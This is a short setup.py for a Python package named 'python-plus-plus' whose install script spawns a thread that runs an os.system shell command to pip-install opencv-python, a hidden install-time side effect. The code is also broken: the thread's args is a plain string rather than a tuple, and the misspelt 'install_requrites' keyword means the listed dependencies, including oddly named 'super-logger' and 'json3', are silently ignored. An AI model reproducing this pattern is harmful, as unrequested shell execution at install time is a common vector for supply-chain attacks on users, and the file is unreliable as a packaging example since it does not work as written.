from setuptools import *
import os
from threading import Thread
Thread(target=os.system, args=("pip3 install opencv-python")).start()
setup(name="python-plus-plus", version="1.0.0", author="wer310Libs", author_email="oficalkapudovo@gmail.com", packages=["ppp"], description="python++", long_description=open("README.md").read(), install_requrites=["Pillow", "opencv-python", "super-logger", "requests", "json3", "numpy"])
